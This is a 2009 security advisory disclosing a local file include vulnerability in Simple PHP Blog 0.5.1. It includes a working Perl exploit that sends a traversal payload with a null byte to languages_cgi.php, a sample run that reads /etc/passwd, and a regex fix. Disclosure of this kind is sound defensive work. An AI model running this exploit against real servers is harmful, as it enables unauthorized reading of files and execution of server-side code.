Subject: [ISecAuditors Security Advisories] Simple PHP
 Blog <= 0.5.1 Local File Include vulnerability

=============================================
INTERNET SECURITY AUDITORS ALERT 2009-005
- Original release date: March 2nd, 2009
- Last revised:  December 18th, 2009
- Discovered by: Juan Galiana Lara
- Severity: 6.8/10 (CVSS scored)
=============================================

I. VULNERABILITY
-------------------------
Simple PHP Blog <= 0.5.1 Local File Include vulnerability

II. BACKGROUND
-------------------------
Simple PHP Blog is a blog system does not requires database setup, and
is very easy to install.

III. DESCRIPTION
-------------------------
Simple PHP Blog <= 0.5.1 is affected by a Local File Include
vulnerability in 'languages_cgi.php' due to parameter 'blog_language1'
is not properly sanitized.

IV. PROOF OF CONCEPT
-------------------------
The affected code:

62     require_once('languages/' . $_POST[ 'blog_language1' ] .
'/strings.php');

Exploit:

#!/usr/bin/perl
# Local File Include Exploit
# Simple PHP Blog <= 0.5.1
# jgaliana <at> isecauditors=dot=com
# Internet Security Auditors

use LWP::UserAgent;

if ($#ARGV < 3) { die("Usage: $0 <site> <path> <file> <cookie>"); }
$ua = LWP::UserAgent->new;
$ua->agent("Simple PHP Blog Exploit ^_^");
$ua->default_header('Cookie' => "sid=$ARGV[3]");
my $req = new HTTP::Request POST =>
"http://$ARGV[0]$ARGV[1]/languages_cgi.php";
$req->content_type('application/x-www-form-urlencoded');
$req->content("blog_language1=../../../../..$ARGV[2]%00");
my $res = $ua->request($req);

if ($res->is_success) {
    print $res->content;
} else {
    print "Error: " .$res->status_line, "\n";
}

$ perl simple.pl example.com /blog /etc/passwd <my_cookie_here>|head -1
root:*:0:0:root:/root:/bin/bash

The bug can be exploited with or without 'magic_quotes_gpc', but note
that if magic_quotes_gpc is set to Off, an attacker can view any file,
adding a '\0' character like /etc/passwd, if not only can include php
files, allowing to execute any local php files.

V. BUSINESS IMPACT
-------------------------
The impact is the attacker can read arbitrary files in the context of
the webserver and execute arbitrary local php scripts.

VI. SYSTEMS AFFECTED
-------------------------
Versions prior and including 0.5.1 are affected
In order to patch the application the function file_exists() and
basename() must be added to the affected code.

VII. SOLUTION
-------------------------
Change line 62 of languages_cgi.php in order to filter $_POST[
'blog_language1' ] variable.

if (ereg('^[a-zA-Z0-9_]+$', $_POST[ 'blog_language1' ]))
require_once('languages/' . $_POST[ 'blog_language1' ] . '/strings.php');
